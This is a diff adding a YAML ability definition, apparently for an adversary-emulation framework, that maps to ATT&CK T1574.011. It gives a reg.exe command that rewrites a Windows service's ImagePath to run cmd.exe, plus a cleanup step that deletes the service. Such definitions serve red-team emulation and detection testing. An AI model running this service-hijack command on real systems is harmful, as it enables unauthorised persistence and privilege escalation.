@@ -1,0 +1,18 @@
+---
+- id: 3de4b86460576de0cab88993cb3f03cd
+  name: Service ImagePath Change with reg.exe
+  description: 'Change Service registry ImagePath of a bengin service to a malicious
+    file
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1574.011
+    name: 'Hijack Execution Flow: Services Registry Permissions Weakness'
+  platforms:
+    windows:
+      cmd:
+        command: reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\calcservice"
+          /f /v ImagePath /d "%windir%\system32\cmd.exe"
+        payloads: []
+        cleanup: sc.exe delete calcservice
